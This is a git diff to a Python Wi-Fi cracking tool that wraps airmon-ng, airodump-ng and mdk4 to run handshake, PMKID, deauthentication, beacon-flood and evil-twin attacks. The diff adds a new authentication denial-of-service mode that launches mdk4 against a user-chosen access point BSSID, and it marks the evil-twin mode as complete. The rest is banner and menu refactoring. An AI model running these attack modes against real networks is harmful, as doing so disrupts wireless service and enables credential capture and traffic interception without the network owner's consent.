@@ -15,6 +15,7 @@ def ctrl_c(signum, frame):
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "yellow")
     os.system("rm -rf Cap*")
+    os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
     time.sleep(2)
     get_colours("\n[*] Exiting the program...", "blue")
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
@@ -26,18 +27,15 @@ signal.signal(signal.SIGINT, ctrl_c)
 
 # Script Banner
 def script_banner():
-    script_name = pyfiglet.figlet_format("WIFI \n~ CRACK", font="slant")
     owner_name = 'By: Gurpreet ~ Singh (Gurpreet06)'
     owner = f"""
-    \t┌─────────────────────────────────────────┐
-    \t│                                         │          
-    \t│ {Fore.BLUE + owner_name}       │     
-    \t│                                         │  
-    \t└─────────────────────────────────────────┘
+            __      _____ ___ ___   /\/|   ___ ___    _   ___ _  __  \t┌─────────────────────────────────────────┐
+     \ \    / /_ _| __|_ _| |/\/   / __| _ \  /_\ / __| |/ /         \t│                                         │        
+      \ \/\/ / | || _| | |        | (__|   / / _ \ (__| ' <          \t│ {Fore.BLUE + owner_name}       │     
+       \_/\_/ |___|_| |___|        \___|_|_\/_/ \_\___|_|\_\         \t│                                         │
+                                                                     \t└─────────────────────────────────────────┘
     """
-
-    print('\n', Fore.YELLOW + script_name, end="")
-    print(owner)
+    print(Fore.YELLOW + owner, " \n")
 
 
 # Colours
@@ -73,9 +71,10 @@ def menu_panel():
     print("")
     get_colours(f"\t Handshake", "blue")
     get_colours(f"\t PKMID", "blue")
+    get_colours(f"\t AAuth (Authentication Denial-Of-Service)", "blue")
     get_colours(f"\t DAuth (Deauthentication attack)", "blue")
     get_colours(f"\t BFlood (Beacon flooding attack)", "blue")
-    get_colours(f"\t ETwin (Evil Twin attack) (working on it)", "blue")
+    get_colours(f"\t ETwin (Evil Twin attack)", "blue")
     print("")
     print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
@@ -292,7 +291,6 @@ def attack_func(network_interface, attack_mode):
 
     # HandShake Attack Mode
     if attack_mode == "Handshake":
-        script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
         # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
@@ -345,7 +343,6 @@ def attack_func(network_interface, attack_mode):
     # PKMID Attack Mode
     elif attack_mode == "PKMID":
         subprocess.run(["clear"])
-        script_banner()
         time.sleep(1)
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
@@ -388,7 +385,6 @@ def attack_func(network_interface, attack_mode):
             quit_program()
     # Deauthentication Attack Mode
     elif attack_mode == "DAuth":
-        script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
         access_name = input(Fore.YELLOW + "Access point name: ")
@@ -435,16 +431,31 @@ def attack_func(network_interface, attack_mode):
     elif attack_mode == "BFlood":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         os.system('clear')
-        script_banner()
         get_colours("[*] Starting the attack...", 'blue')
         get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
             f"xterm -hold -e sudo mdk4 {network_interface} b -s 950")
         quit_program()
+    # Authentication Denial-Of-Service
+    elif attack_mode == "AAuth":
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}"])
+        access_bssid = input(Fore.YELLOW + "Access point BSSID: ")
+        time.sleep(1)
+        get_colours("\n[*] Setting up things...", 'cyan')
+        try:
+            process.wait(timeout=2)  # Time for the process
+        except subprocess.TimeoutExpired:
+            process.kill()
+        get_colours("[*] Starting the attack...", 'blue')
+        get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
+        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
+        os.system(
+            f"xterm -hold -e sudo mdk4 {network_interface} a -a -i {access_bssid}")
+        quit_program()
     # Evil Twin Attack
     elif attack_mode == "ETwin":
-        script_banner()
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         access_name = input(Fore.YELLOW + "Access point name: ")
         access_channel = input(Fore.YELLOW + "Channel number: ")
@@ -502,12 +513,25 @@ def quit_program():
     time.sleep(2)
     get_colours("\n[!] Exiting the program...", "blue")
     # os.system("rm -rf Cap*")
+    os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "magenta")
     print(Fore.WHITE)
     exit(0)
+
+
+def attackModes():
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+          f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
+    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
+    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
+    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
+    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
+    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
+    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '6. AAuth'}")
+    print(Fore.WHITE)
 
 
 def check_parms():
@@ -524,7 +548,7 @@ def check_parms():
                                                                             " '%s' | awk '{print $1}' FS=':'" % (
                                                                                 sys.argv[2], sys.argv[2]),
                                                                             shell=True).decode().strip()
-                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin"]
+                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin", "AAuth"]
                             if sys.argv[2] != check_interface_exist:
                                 print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                                       f"{Fore.YELLOW + 'Invalid Network Interface name'}")
@@ -536,39 +560,18 @@ def check_parms():
                                     print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                                     cnt = cnt + 1
                             elif sys.argv[4] not in check_attack_mode:
-                                print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                      f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
-                                print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
-                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
-                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
-                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
-                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
-                                print(Fore.WHITE)
+                                attackModes()
                             else:
                                 os.system('clear')
                                 check_deps()  # Check for necessary program to run this script.
                         else:
-                            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                  f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
-                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
-                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
-                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
-                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
-                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
-                            print(Fore.WHITE)
+                            attackModes()
                     else:
                         print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                               f"{Fore.YELLOW + 'Missing the [-a] parameter.'}")
                         print(Fore.WHITE)
                 else:
-                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                          f"{Fore.YELLOW + 'Select a valid attack Mode: '}")
-                    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. Handshake'}")
-                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
-                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
-                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
-                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
-                    print(Fore.WHITE)
+                    attackModes()
             else:
                 print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                       f"{Fore.YELLOW + 'Invalid Network Interface name'}")
